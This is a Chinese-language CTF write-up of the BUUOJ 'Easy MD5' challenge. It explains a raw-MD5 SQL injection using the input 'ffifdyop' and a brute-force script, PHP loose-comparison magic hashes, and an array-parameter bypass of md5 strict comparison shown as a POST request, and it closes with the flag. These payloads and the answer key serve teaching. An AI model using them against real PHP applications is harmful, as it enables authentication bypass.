# Easy MD5

[题目地址](https://buuoj.cn/challenges#[BJDCTF2020]Easy%20MD5)

网站就一个框给你填，翻了源代码也没东西。我找提示的水平就这样了，看[wp](https://blog.csdn.net/xhy18634297976/article/details/122747034)才知道服务器发给我们的包里有提示，chrome可以直接在network看到。

```
HTTP/1.1 200 OK
Server: openresty
Date: Thu, 27 Oct 2022 04:11:30 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Hint: select * from 'admin' where password=md5($pass,true)
X-Powered-By: PHP/7.3.13
```

下次连这里也要留心眼了。hint指示的应该是提交的内容被放入sql语句中的方式，$pass是提交的内容，[md5](https://www.php.net/manual/zh/function.md5.php)的第二个参数指示md5 摘要将以 16 字符长度的原始二进制格式返回。原始二进制代表返回值不再是我们熟悉的16进制形式，什么稀奇古怪的玩意都会出现，包括引号。等一下，引号？这不就可以闭合了吗？好家伙我们要用md5值来sql注入。要找一个md5值是' or 'xxxx的字符串，sql注入基操。

```php
<?php 
for ($i = 0;;) { 
 for ($c = 0; $c < 1000000; $c++, $i++)
  if (stripos(md5($i, true), '\'or\'') !== false)
   echo "\nmd5($i) = " . md5($i, true) . "\n";
 echo ".";
}
?>
```

这是大佬的脚本，得到ffifdyop，md5加密后会返回'or'6XXXXXXXXX(这里的XXXXX是一些乱码和不可见字符)。因为sql和php的特性很像，做布尔判断时，以数字开头的字符串会被当做整型数，所以6XXXXXXXXX会被看成6，6也能表示true，成功绕过。

进入下一关。这回源代码有提示了。

```php
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
```

要求a不等于b但是a的md5值弱等于b的md5值。弱等于就很灵魂，php智能这点人尽皆知了，== 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较。如果两边的md5值都是0e，php就会把它视为科学计数法，而0e后面是什么不重要，0的多少次方还是0，无论如何都会想等。上面的md5官方文档评论区中就给了这样两个字符串：240610708和QNKCDZO。get传参后来到最后一关。

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

一样的套路，但是这回是强等于了，怎么办？这就不得不提到md5的特性了：如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值时，会报警告，但是还能得到===强比较的值相等。可以做个实验。

```php
<?php
$a[]=1;
$b[]=2;
if(md5($a)===md5($b)){
	echo "yes";
}
?>
```

输出yes。post得到flag。

```
POST /levell14.php HTTP/1.1
Host: 154fe26d-aae4-4ce3-8884-43ba62b3fb83.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

param1[]=1&param2[]=2
```

为什么$_POST['param1']能取到param1[\]的值？因为param1[\]代表数组，param1\[\]的名字还是param1，[]仅仅指示这是个数组，跟名字没关系。

### Flag
- flag{5c74f362-c738-480d-b614-b5bd5c15b83b}